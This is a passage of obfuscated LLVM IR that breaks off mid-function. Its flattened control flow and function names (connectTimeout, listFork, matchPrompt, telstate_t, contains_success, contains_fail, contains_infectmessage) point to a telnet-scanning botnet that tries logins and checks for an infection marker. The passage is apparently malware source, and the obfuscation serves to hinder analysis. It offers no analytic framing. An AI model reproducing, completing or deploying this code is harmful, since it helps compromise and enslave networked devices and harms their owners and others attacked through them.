  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 994440095, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 994440095, label %8
    i32 2060601492, label %17
    i32 984770216, label %18
    i32 -1775775104, label %19
    i32 -78525020, label %24
    i32 1172706268, label %34
    i32 1956931165, label %35
    i32 -273521241, label %36
    i32 -422260785, label %39
    i32 606292440, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 2060601492, i32 984770216
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 994440095, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1775775104, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 -78525020, i32 -422260785
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 1172706268, i32 1956931165
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 606292440, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 -273521241, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -1775775104, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 606292440, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -135918996, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -135918996, label %first
    i32 -1339030861, label %37
    i32 1729676017, label %38
    i32 -470017172, label %47
    i32 -277515568, label %52
    i32 -621130275, label %57
    i32 -847902189, label %66
    i32 1132599955, label %83
    i32 -911600320, label %90
    i32 -1249509877, label %91
    i32 674072079, label %92
    i32 -544673662, label %93
    i32 -1099079006, label %94
    i32 1834199182, label %95
    i32 576868516, label %96
    i32 -347442692, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -1339030861, i32 1729676017
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -347442692, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -470017172, i32 576868516
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 -277515568, i32 -1099079006
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -621130275, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -847902189, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 1132599955, i32 674072079
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #5
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -911600320, i32 -1249509877
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -347442692, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -544673662, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -347442692, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 1834199182, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -347442692, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 576868516, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -347442692, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1548201167, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1548201167, label %first
    i32 -208714589, label %9
    i32 -671260987, label %11
    i32 1550497048, label %19
    i32 1275163665, label %26
    i32 -1367767163, label %36
    i32 -2128555613, label %39
    i32 -949952171, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 -208714589, i32 -671260987
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -949952171, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #5
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 1550497048, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 1275163665, i32 -2128555613
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 -1367767163, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 1550497048, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #5
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -949952171, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 1571600113, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1571600113, label %11
    i32 -251863030, label %18
    i32 -552989886, label %19
    i32 -887251750, label %24
    i32 -753382019, label %37
    i32 699126149, label %50
    i32 -1278672782, label %63
    i32 -1465175224, label %75
    i32 -1255550826, label %76
    i32 -1142292114, label %78
    i32 856989683, label %81
    i32 -676148703, label %100
    i32 31498827, label %101
    i32 -1707594199, label %102
    i32 -1171183770, label %105
    i32 -1844475538, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -251863030, i32 -1171183770
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -552989886, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 -887251750, i32 -1255550826
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 -1465175224, i32 -753382019
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -1465175224, i32 699126149
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 -1465175224, i32 -1278672782
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 -1465175224, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1255550826, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 -1142292114, i32 856989683
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -552989886, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 -676148703, i32 31498827
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1844475538, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -1707594199, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 1571600113, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1844475538, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1646827880, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1646827880, label %first
    i32 1698413917, label %8
    i32 1986122117, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 1698413917, i32 1986122117
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 1986122117, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 512, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1021657245, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1021657245, label %first
    i32 -1409324040, label %7
    i32 1004127874, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 1004127874, i32 -1409324040
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 1004127874, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_infectmessage(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 1097693795, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1097693795, label %33
    i32 -933610251, label %39
    i32 2067343780, label %44
    i32 361077391, label %48
    i32 -1276869521, label %49
    i32 -1286778840, label %51
    i32 -1342982170, label %52
    i32 1514870862, label %61
    i32 -1165162607, label %78
    i32 -707581562, label %79
    i32 -1639092140, label %91
    i32 1807375982, label %95
    i32 520536733, label %96
    i32 -17378805, label %105
    i32 106875977, label %114
    i32 1520752860, label %118
    i32 -1272793467, label %119
    i32 -1804981183, label %128
    i32 -1436044346, label %129
    i32 806212644, label %130
    i32 -118611189, label %136
    i32 -1172635683, label %140
    i32 204164153, label %145
    i32 1766197294, label %146
    i32 -1084922481, label %147
    i32 450900324, label %148
    i32 1826245793, label %152
    i32 298613042, label %153
    i32 1263211672, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
